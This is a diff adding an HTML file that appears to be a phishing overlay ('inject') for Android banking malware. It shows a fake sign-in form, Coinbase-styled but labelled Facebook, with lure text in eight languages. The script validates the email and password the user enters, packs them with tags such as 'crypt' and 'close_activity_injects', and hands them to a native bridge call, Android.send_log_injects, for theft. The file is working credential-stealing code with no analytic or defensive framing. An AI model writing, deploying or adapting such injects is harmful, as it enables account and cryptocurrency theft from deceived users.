@@ -1,0 +1,301 @@
+<!DOCTYPE html> 
+<html lang="en" ng-app="app">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>    
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css"></title>
+    <style>
+        body {
+            background-color: #1652f0;
+            padding: 0;
+            margin: 0;
+        }
+
+        form {
+            margin: 15px;
+            background-color: #fff;
+            padding: 15px;
+            border: 0;
+            border-radius: 4px;
+        }
+
+        form > label {
+            font-weight: 600;
+            margin: 0;
+        }
+
+        form > .input{
+            width: 100%;
+            border: 0;
+            padding: 7px;
+            padding-left: 0;
+            border-bottom: 1px solid #f1f3f5;
+            margin-bottom: 10px;
+        }
+
+        input::placeholder {
+            color: #999999;
+        }
+
+        input {outline: none;
+            box-shadow: none;}
+
+        .row {
+            font-size: 14px;
+            color: rgb(228, 228, 228);
+            font-weight: 500;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            background-color: transparent;
+            border: 0;
+            color: #1652f0;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .error {
+            border-bottom: 1px solid #f00 !important;
+        }
+
+        .errorIcon {
+            position: absolute;
+            right: 40px;
+            color: #f00;
+            font-size: 20px;
+            top: 66px;
+        }
+
+        .errorIcon::after {
+            content: "";
+            position: relative;
+            right: 15px;
+            top: 5px;
+            border: 6px solid transparent;
+            border-top-color: transparent;
+            border-bottom-color: #f00;
+        }
+
+        .errorText {
+            border: 0;
+            border-top: 5px solid #f00;
+            background-color: #191919;
+            color: rgb(228, 228, 228);
+            position: absolute;
+            padding: 5px 15px;
+            right: 15px;
+            top: 97px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .show {
+            display: block !important;
+        }
+    </style>
+</head>
+<body ng-controller="c1">
+    <form onsubmit="return false">
+        <label for="email">{{t.__text1}}</label>
+        <input type="email" name="email" class="input" id="email" placeholder="you@domain.com" autocomplete="off">
+        <div class="hidden" id="hiddenEmail" style="position: absolute; right: 0;width: 100%;top: 0;">
+            <i class="fa fa-exclamation-circle errorIcon" aria-hidden="true"></i>
+            <div class="errorText">
+                {{t.__text2}}
+            </div>
+        </div>
+
+        <label for="password">{{t.__text3}}</label>
+        <input type="password" name="password" class="input" id="password" placeholder="{{t.__text4}}">
+        <div class="hidden" id="hiddenPassword" style="position: absolute; right: 0;width: 100%;top: 73px;">
+            <i class="fa fa-exclamation-circle errorIcon" aria-hidden="true"></i>
+            <div class="errorText">
+                {{t.__text5}}
+            </div>
+        </div>
+
+        <input type="submit" id="send_data" value="{{t.__text6}}">
+    </form>
+    <div class="container">
+        <div class="row">
+            <div class="col-6 text-right">{{t.__text7}}</div>
+            <div class="col-6">{{t.__text8}}</div>
+        </div>
+    </div>
+
+    <script>
+
+        var btn = document.getElementById('send_data');
+        
+        var emailField = document.getElementById('email'),
+            passField = document.getElementById('password'),
+            emailError = document.getElementById('hiddenEmail'),
+            passError = document.getElementById('hiddenPassword');
+
+        btn.onclick = function (){
+            // var btnCheck = document.getElementById('send_data');
+            try{
+                emailField.className = 'input';
+                passField.className = 'input';
+             } catch(e){};
+
+            if(!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(emailField.value)) {
+                try{
+                    emailField.className = 'input error';
+                    emailError.className = 'hidden show';
+                    emailField.focus();
+                 } catch(e){};
+                 return false;
+            }
+            
+            if(passField.value.length < 6) {
+                try{
+                    emailField.className = 'input';
+                    emailError.className = 'hidden';
+                    passField.className = 'input error';
+                    passError.className = 'hidden show';
+                    passField.focus();
+                 } catch(e){};
+                 return false;
+            }else{
+                emailField.className = 'input';
+                passField.className = 'input';
+                passError.className = 'hidden';
+            }
+
+            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(emailField.value) && passField.value.length > 6) {
+                var data = {};
+                data.email = emailField.value;
+                data.password = passField.value;
+                data.type_injects = "crypt";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+            }
+        }
+    </script>
+    
+    <script>
+        var text, 
+            link = "facebook.com", 
+            appname = "Facebook", 
+            texts = { 
+                ru: { 
+                    __text1: "EMAIL",
+                    __text2: "Email is a required field",
+                    __text3: "PASSWORD",
+                    __text4: "Enter your password",
+                    __text5: "Password is a required field",
+                    __text6: "Sign In",
+                    __text7: "Forgot password?",
+                    __text8: "Privacy Policy",
+                }, 
+        
+                en: { 
+                    __text1: "EMAIL",
+                    __text2: "Email is a required field",
+                    __text3: "PASSWORD",
+                    __text4: "Enter your password",
+                    __text5: "Password is a required field",
+                    __text6: "Sign In",
+                    __text7: "Forgot password?",
+                    __text8: "Privacy Policy",
+                }, 
+        
+                tr: { 
+                    __text1: "POSTA",
+                    __text2: "E-posta gerekli bir alandır",
+                    __text3: "ŞİFRE",
+                    __text4: "Şifrenizi girin",
+                    __text5: "Şifre gerekli bir alandır",
+                    __text6: "Giriş yap",
+                    __text7: "Şifremi unuttum?",
+                    __text8: "Gizlilik Politikası",
+                }, 
+                
+                es: { 
+                    __text1: "CORREO",
+                    __text2: "El correo electrónico es un campo obligatorio",
+                    __text3: "CONTRASEÑA",
+                    __text4: "Introduzca su contraseña",
+                    __text5: "La contraseña es un campo obligatorio",
+                    __text6: "Inicio de sesión",
+                    __text7: "Recuperar contraseña",
+                    __text8: "Política de privacidad",
+                },  
+        
+                fr: { 
+                    __text1: "COURRIEL",
+                    __text2: "Le courrier électronique est un champ obligatoire",
+                    __text3: "MOT de passe",
+                    __text4: "Entrez votre mot de passe",
+                    __text5: "Mot de passe est un champ obligatoire",
+                    __text6: "Signe Dans",
+                    __text7: "Mot de passe oublié?",
+                    __text8: "Confidentialité",
+                }, 
+        
+                ro: { 
+                    __text1: "EMAIL",
+                    __text2: "E-mailul este un câmp obligatoriu",
+                    __text3: "Cuvântul parolă",
+                    __text4: "Introdu parola",
+                    __text5: "Parola este un câmp obligatoriu",
+                    __text6: "Conectați-vă",
+                    __text7: "Ai uitat parola?",
+                    __text8: "Politica de confidențialitate",
+                }, 
+        
+                it: { 
+                    __text1: "EMAIL",
+                    __text2: "L'Email è un campo obbligatorio",
+                    __text3: "PASSWORD",
+                    __text4: "Inserisci la tua password",
+                    __text5: "La Password è un campo obbligatorio",
+                    __text6: "Accedi",
+                    __text7: "Hai dimenticato la password?",
+                    __text8: "Privacy",
+                },  
+        
+                de: { 
+                    __text1: "EMAIL",
+                    __text2: "E-Mail ist ein Pflichtfeld",
+                    __text3: "PASSWORT",
+                    __text4: "Geben Sie Ihr Passwort ein",
+                    __text5: "Passwort ist ein Pflichtfeld",
+                    __text6: "Anmelden",
+                    __text7: "Passwort vergessen?",
+                    __text8: "Datenschutzerklärung",
+                }, 
+            }
+            var language = window.navigator.userLanguage || window.navigator.language; 
+            language = language.match(/^.{2}/), texts[language] == undefined ? text = texts.en : text = texts[language]; 
+
+            var app = angular.module("app", []); 
+            app.controller("c1", ["$scope", "$rootScope", function (t, e) { 
+                rootScope = e, 
+                scope = t, 
+                e.scums = [], 
+                t.t = text, 
+                t.reset = function () { 
+                    $(e.scums).each(function () { 
+                        this.reset() }) 
+                } 
+            }]);
+        </script>
+</body>
+</html> 
